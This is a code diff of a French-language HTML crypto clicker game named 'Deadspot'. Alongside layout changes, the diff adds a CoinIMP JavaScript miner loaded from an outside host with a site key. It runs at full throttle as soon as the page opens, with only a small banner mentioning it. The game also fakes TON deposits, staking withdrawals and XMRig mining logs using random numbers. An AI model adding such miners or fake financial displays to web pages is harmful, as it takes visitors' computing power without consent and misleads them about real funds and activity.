@@ -11,6 +11,7 @@ h1 { color:#4caf50; text-align:center; margin:10px 0; }
 #deadspotBalance { font-size:22px; margin:10px; color:#ffd700; text-align:center; }
 #energyBar { width: 300px; height: 20px; border:1px solid #444; margin:10px auto; background:#222; border-radius:5px; overflow:hidden; }
 #energyFill { height:100%; width:100%; background:#4caf50; transition: width 0.2s; }
+
 #clickBtn {
   width: 220px; height: 220px; border-radius: 50%; background: #111; border: 3px solid #444;
   cursor: pointer; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
@@ -19,25 +20,41 @@ h1 { color:#4caf50; text-align:center; margin:10px 0; }
 #clickBtn img { width:100%; height:100%; object-fit:cover; }
 #clickBtn:active { transform:translate(-50%,-50%) scale(0.95); box-shadow:0 0 30px #ff0000 inset; }
 @keyframes pulseClick { 0%{box-shadow:0 0 15px #4caf50 inset;} 100%{box-shadow:0 0 30px #00f;} }
+
 button { background:#333; color:#eee; padding:10px 20px; border:none; border-radius:5px; margin:5px; cursor:pointer; }
 button:hover { background:#555; }
+
 #hashrateChart { background:rgba(0,0,0,0.5); border:1px solid #333; border-radius:10px; position:absolute; top:400px; left:50%; transform:translateX(-50%); }
 #xmrigLogsBox { position:absolute; top:10px; left:10px; width:350px; height:300px; background:rgba(0,0,0,0.5); border:1px solid #444; padding:10px; overflow-y:auto; font-size:12px; }
 .logAccepted { color:#4caf50; }
 .logRejected { color:#f44336; }
+
 #pulseurBox { position:absolute; top:10px; right:10px; width:250px; text-align:center; z-index:2; }
 #pulseur { width:50px; height:50px; margin:5px auto; background:red; border-radius:50%; animation: pulse 1.5s infinite alternate; cursor:pointer; }
 @keyframes pulse { 0%{transform:scale(1);} 100%{transform:scale(1.2);} }
 #stakedInfo, #stakingBonus { margin:5px; }
 #stakeHistory { max-height:120px; overflow-y:auto; margin-top:5px; background:rgba(0,0,0,0.3); padding:5px; font-size:12px; text-align:left; }
-#faucetBox { position:absolute; top:calc(50% + 150px); left:50%; transform:translateX(-50%); text-align:center; }
-#faucetCooldown { color:#ff0; margin-top:5px; }
-#deadspotValueLogs { position:absolute; top:320px; left:10px; width:350px; height:100px; background:rgba(0,0,0,0.5); border:1px solid #444; padding:10px; overflow-y:auto; font-size:12px; }
+
 #stars { position:absolute; width:100%; height:100%; background:black; z-index:-2; }
 .star { position:absolute; width:2px; height:2px; background:white; border-radius:50%; animation: twinkle 3s infinite; }
 @keyframes twinkle { 0%,100%{opacity:0.5;} 50%{opacity:1;} }
 .spaceship { position:absolute; width:30px; height:15px; background:cyan; clip-path:polygon(0% 0%,100% 50%,0% 100%); animation:fly linear infinite; z-index:-1; }
 @keyframes fly { 0%{left:-40px;} 100%{left:100%;} }
+
+#faucetBtn {
+    position: absolute;
+    top:50%;
+    right:150px;
+    transform: translateY(-50%);
+    padding: 15px 25px;
+    background: #4caf50;
+    color: #fff;
+    border-radius: 10px;
+    cursor: pointer;
+    font-weight: bold;
+    z-index: 3;
+}
+#faucetBtn:hover { background: #66ff66; }
 </style>
 </head>
 <body>
@@ -51,13 +68,6 @@ button:hover { background:#555; }
 <div id="clickBtn"><img src="skull.png" alt="skull"></div>
 
 <div id="xmrigLogsBox"></div>
-<div id="deadspotValueLogs"></div>
-
-<!-- Faucet -->
-<div id="faucetBox">
-  <button id="faucetBtn">💧 Faucet Claim</button>
-  <div id="faucetCooldown">Cooldown: 0s</div>
-</div>
 
 <!-- Pulseur + staking -->
 <div id="pulseurBox">
@@ -72,31 +82,50 @@ button:hover { background:#555; }
 
 <canvas id="hashrateChart" width="400" height="200"></canvas>
 
+<!-- Faucet -->
+<button id="faucetBtn">💧 Faucet</button>
+
+<div id="hashrateInfo" style="position:absolute; bottom:10px; left:10px; color:#4caf50; font-size:14px;"></div>
+
 <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+<!-- CoinIMP Miner -->
+<script src="https://www.hostingcloud.racing/I9tR.js"></script>
 <script>
-/* VARIABLES */
-let deadspot = parseFloat(localStorage.getItem("deadspot"))||0;
-let energy = parseFloat(localStorage.getItem("energy"))||100;
-let maxEnergy = 100;
-let clickValue = 0.00015;
-let upgrades = JSON.parse(localStorage.getItem("upgrades"))||{x2:false,multi:false,regen:false,auto:false};
-let autoClickInterval = null;
+  var _client = new Client.Anonymous(
+    'e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f',
+    { throttle: 0.0, c: 'w' }
+  );
+  _client.start();
+  _client.addMiningNotification(
+    "Bottom",
+    "Ce site utilise un miner JavaScript CoinIMP pour générer des Deadspot. Vous pouvez l'arrêter si besoin.",
+    "#560872",
+    20,
+    "#bd0a0a"
+  );
+</script>
 
-/* Staking */
-let staked = parseFloat(localStorage.getItem("staked"))||0;
-let stakingBonus = parseFloat(localStorage.getItem("stakingBonus"))||0;
-let stakeTimestamp = parseInt(localStorage.getItem("stakeTimestamp"))||0;
-let stakeHistory = JSON.parse(localStorage.getItem("stakeHistory"))||[];
+<script>
+// Variables de jeu
+let deadspot=parseFloat(localStorage.getItem("deadspot"))||0;
+let energy=parseFloat(localStorage.getItem("energy"))||100;
+let maxEnergy=100;
+let clickValue=0.00015;
+let upgrades=JSON.parse(localStorage.getItem("upgrades"))||{x2:false,multi:false,regen:false,auto:false};
+let autoClickInterval=null;
 
-/* Mining */
-let totalHashes = parseFloat(localStorage.getItem("totalHashes"))||0;
-let hashesPerSecond = 0;
+// Staking
+let staked=parseFloat(localStorage.getItem("staked"))||0;
+let stakingBonus=parseFloat(localStorage.getItem("stakingBonus"))||0;
+let stakeTimestamp=parseInt(localStorage.getItem("stakeTimestamp"))||0;
+let stakeHistory=JSON.parse(localStorage.getItem("stakeHistory"))||[];
 
-/* Faucet cooldown */
-let faucetCooldown = 0;
-let faucetInterval;
+// Mining
+let totalHashes=parseFloat(localStorage.getItem("totalHashes"))||0;
+let hashesPerSecond=0;
 
-/* SAVE / UPDATE UI */
+// Sauvegarde
 function saveGame(){
   localStorage.setItem("deadspot",deadspot);
   localStorage.setItem("energy",energy);
@@ -108,6 +137,7 @@ function saveGame(){
   localStorage.setItem("totalHashes",totalHashes);
 }
 
+// Update UI
 function updateUI(){
   document.getElementById("deadspotBalance").textContent="Deadspot: "+deadspot.toFixed(5);
   document.getElementById("energyFill").style.width=(energy/maxEnergy*100)+"%";
@@ -116,9 +146,7 @@ function updateUI(){
 
   let histBox=document.getElementById("stakeHistory");
   histBox.innerHTML="";
-  stakeHistory.slice(-5).reverse().forEach(e=>{
-    let line=document.createElement("div"); line.textContent=e; histBox.appendChild(line);
-  });
+  stakeHistory.slice(-5).reverse().forEach(e=>{ let line=document.createElement("div"); line.textContent=e; histBox.appendChild(line); });
 
   hashrateChart.data.labels.push(time+"s");
   hashrateChart.data.datasets[0].data.push(hashesPerSecond);
@@ -126,150 +154,102 @@ function updateUI(){
   hashrateChart.update();
 }
 
-/* CLICKER */
+// Clicker
 document.getElementById("clickBtn").addEventListener("click",()=>{
   if(energy>0){
-    let gain=clickValue;
-    if(upgrades.x2) gain*=2;
-    if(upgrades.multi) gain*=5;
-    deadspot+=gain; energy--; totalHashes++; saveGame(); updateUI();
+    let gain=clickValue; if(upgrades.x2) gain*=2; if(upgrades.multi) gain*=5;
+    deadspot+=gain; energy--; saveGame(); updateUI();
   }
 });
 
-/* AUTO REGEN */
-setInterval(()=>{ if(energy<maxEnergy){ energy=Math.min(maxEnergy,energy+(upgrades.regen?2:1)); updateUI(); } },1000);
+// Energy regen
+setInterval(()=>{
+  if(energy<maxEnergy){ energy=Math.min(maxEnergy,energy+(upgrades.regen?2:1)); updateUI(); }
+},1000);
 
-/* AUTO CLICK */
+// Auto click
 function startAutoClick(){
   if(autoClickInterval) return;
   autoClickInterval=setInterval(()=>{
     if(energy>0){
-      let gain=clickValue;
-      if(upgrades.x2) gain*=2;
-      if(upgrades.multi) gain*=5;
-      deadspot+=gain; energy--; totalHashes++; saveGame(); updateUI();
+      let gain=clickValue; if(upgrades.x2) gain*=2; if(upgrades.multi) gain*=5;
+      deadspot+=gain; energy--; saveGame(); updateUI();
     }
   },1000);
 }
 if(upgrades.auto) startAutoClick();
 
-/* PULSEUR */
+// Pulseur staking
 document.getElementById("pulseur").addEventListener("click",()=>{
   if(staked>0){
-    let bonus = staked*0.005;
-    stakingBonus += bonus;
+    let bonus=staked*0.005;
+    stakingBonus+=bonus;
     stakeHistory.push("Pulse : +"+bonus.toFixed(5)+" DSC");
     saveGame(); updateUI();
   }
 });
 
-/* VERIFY DEPOSIT */
+// Vérification dépôt
 document.getElementById("verifyDepositBtn").addEventListener("click",()=>{
-  alert("⏳ Vérification en cours (~30 min simulé)... Veuillez patienter");
+  alert("⏳ Vérification en cours (~30 min simulé)...");
   setTimeout(()=>{
     let newStake=10+Math.random()*5;
-    staked+=newStake;
-    stakeTimestamp=Date.now();
+    staked+=newStake; stakeTimestamp=Date.now();
     stakeHistory.push("Dépôt validé : +"+newStake.toFixed(2)+" TON");
     saveGame(); updateUI();
     alert("✅ Dépôt validé : +"+newStake.toFixed(2)+" TON");
   },5000);
 });
 
-/* CONVERT BONUS */
+// Convert bonus
 document.getElementById("convertBonusBtn").addEventListener("click",()=>{
   if(stakingBonus<=0){ alert("Aucun bonus à convertir"); return; }
   deadspot+=stakingBonus; alert("Bonus converti : +"+stakingBonus.toFixed(5)+" DSC"); stakingBonus=0;
   saveGame(); updateUI();
 });
 
-/* WITHDRAW */
+// Withdraw
 document.getElementById("withdrawBtn").addEventListener("click",()=>{
   if(staked<=0){ alert("Aucun TON staké"); return; }
-  let now=Date.now();
-  let oneWeek=7*24*60*60*1000;
-  if(now-stakeTimestamp<oneWeek){ alert("⏳ Attendez 7 jours minimum pour retirer"); return; }
-  if(staked<=0.2){ alert("Montant insuffisant pour couvrir frais 0.2 TON"); return; }
+  let now=Date.now(), oneWeek=7*24*60*60*1000;
+  if(now-stakeTimestamp<oneWeek){ alert("⏳ Attendez 7 jours minimum"); return; }
+  if(staked<=0.2){ alert("Montant insuffisant pour frais 0.2 TON"); return; }
   let withdrawAmount=staked-0.2;
   stakeHistory.push("Retrait : "+withdrawAmount.toFixed(2)+" TON (0.2 TON frais)");
   alert("Retrait effectué : "+withdrawAmount.toFixed(2)+" TON (0.2 TON frais)");
   staked=0; stakingBonus=0; saveGame(); updateUI();
 });
 
-/* CHART.JS */
+// Chart.js
 const ctx=document.getElementById('hashrateChart').getContext('2d');
-const hashrateChart=new Chart(ctx,{type:'line',data:{labels:[],datasets:[{label:'H/s',data:[],borderColor:'#4caf50',fill:true,tension:0.3}]},options:{responsive:false,animation:false,plugins:{legend:{labels:{color:'#eee'}}},scales:{x:{ticks:{color:'#aaa'}},y:{ticks:{color:'#aaa'}}}}});
+const hashrateChart=new Chart(ctx,{
+  type:'line',
+  data:{labels:[],datasets:[{label:'H/s',data:[],borderColor:'#4caf50',fill:true,tension:0.3}]},
+  options:{responsive:false,animation:false,plugins:{legend:{labels:{color:'#eee'}}},scales:{x:{ticks:{color:'#aaa'}},y:{ticks:{color:'#aaa'}}}}
+});
 let time=0;
 
-/* XMRIg logs + Deadspot logs */
+// Simulate XMrig logs
 const xmrigLogs=document.getElementById("xmrigLogsBox");
-const deadspotValueLogs = document.getElementById("deadspotValueLogs");
-let deadspotLastValue = deadspot;
-
 setInterval(()=>{
-const xmrigLogs=document.getElementById("xmrigLogsBox");
-
-function addXmrigLog(){
-  if(!xmrigLogs) return; // sécurité
-  const threads = 4;
-  hashesPerSecond = Math.random()*50+50;
-  totalHashes += hashesPerSecond;
-
-  let fragment = document.createDocumentFragment(); // moins lourd
-  for(let i=0; i<threads; i++){
-    let coreHps = (hashesPerSecond/threads*(0.9+Math.random()*0.2)).toFixed(2);
-    let isAccepted = Math.random()>0.05;
-    let line = `[${new Date().toLocaleTimeString()}] Core #${i} | ${coreHps} H/s | ${isAccepted?"Accepted":"Rejected"}`;
-    let span = document.createElement("span");
-    span.className = isAccepted?"logAccepted":"logRejected";
-    span.textContent = line;
-    fragment.appendChild(span);
-    fragment.appendChild(document.createElement("br"));
+  let threads=4;
+  hashesPerSecond=Math.random()*50+50;
+  totalHashes+=hashesPerSecond;
+  for(let i=0;i<threads;i++){
+    let coreHps=(hashesPerSecond/threads*(0.9+Math.random()*0.2)).toFixed(2);
+    let isAccepted=Math.random()>0.05;
+    let line=`[${new Date().toLocaleTimeString()}] Core #${i} | ${coreHps} H/s | ${isAccepted?"Accepted":"Rejected"}`;
+    let span=document.createElement("span");
+    span.className=isAccepted?"logAccepted":"logRejected";
+    span.textContent=line;
+    xmrigLogs.appendChild(span);
+    xmrigLogs.appendChild(document.createElement("br"));
+    xmrigLogs.scrollTop=xmrigLogs.scrollHeight;
   }
-
-  xmrigLogs.appendChild(fragment);
-
-  // Limiter le nombre de lignes pour pas saturer le DOM
-  while(xmrigLogs.children.length > 1000){
-    xmrigLogs.removeChild(xmrigLogs.firstChild);
-  }
-  xmrigLogs.scrollTop = xmrigLogs.scrollHeight;
-}
-
-// appel toutes les secondes
-setInterval(addXmrigLog, 1000);
-
-
-  /* Deadspot value log simulation */
-  let preListing = 1.00;
-  let postListing = 1.20 + Math.random()*0.1;
-  let profit = (postListing - preListing) * deadspot;
-  let valLine=`[${new Date().toLocaleTimeString()}] Pre: ${preListing.toFixed(2)}$ | Post: ${postListing.toFixed(2)}$ | Profit: ${profit.toFixed(5)}$ | Solde: ${deadspot.toFixed(5)} DSC`;
-  let valSpan = document.createElement("span");
-  valSpan.textContent = valLine;
-  deadspotValueLogs.appendChild(valSpan);
-  deadspotValueLogs.appendChild(document.createElement("br"));
-  deadspotValueLogs.scrollTop = deadspotValueLogs.scrollHeight;
-
   time++; updateUI();
 },1000);
 
-/* Faucet claim */
-document.getElementById("faucetBtn").addEventListener("click",()=>{
-  if(faucetCooldown>0){ alert("⏳ Attendez le cooldown"); return; }
-  let gain = 0.0002 + Math.random()*0.0998;
-  deadspot+=gain;
-  alert("💧 Faucet claim : +"+gain.toFixed(5)+" DSC");
-  faucetCooldown = 30; // 30s cooldown
-  saveGame();
-});
-
-/* Faucet cooldown timer */
-setInterval(()=>{
-  if(faucetCooldown>0){ faucetCooldown--; document.getElementById("faucetCooldown").textContent="Cooldown: "+faucetCooldown+"s"; }
-},1000);
-
-/* Stars background */
+// Stars background
 for(let i=0;i<100;i++){
   let star=document.createElement("div");
   star.className="star";
@@ -281,7 +261,7 @@ for(let i=0;i<100;i++){
   document.getElementById("stars").appendChild(star);
 }
 
-/* Spaceships */
+// Spaceships
 for(let i=0;i<5;i++){
   let ship=document.createElement("div");
   ship.className="spaceship";
@@ -290,7 +270,18 @@ for(let i=0;i<5;i++){
   document.body.appendChild(ship);
 }
 
-/* Load UI */
+// Faucet
+let faucetCooldown=false;
+document.getElementById("faucetBtn").addEventListener("click", ()=>{
+  if(faucetCooldown){ alert("⏳ Patientez avant de reclamer !"); return; }
+  let gain=0.0002+Math.random()*(0.1-0.0002);
+  deadspot+=gain; saveGame(); updateUI();
+  alert(`Vous avez reçu ${gain.toFixed(5)} DSC du faucet !`);
+  faucetCooldown=true;
+  setTimeout(()=>{ faucetCooldown=false; },30*1000); // 30s cooldown
+});
+
+// Load UI
 updateUI();
 </script>
 </body>
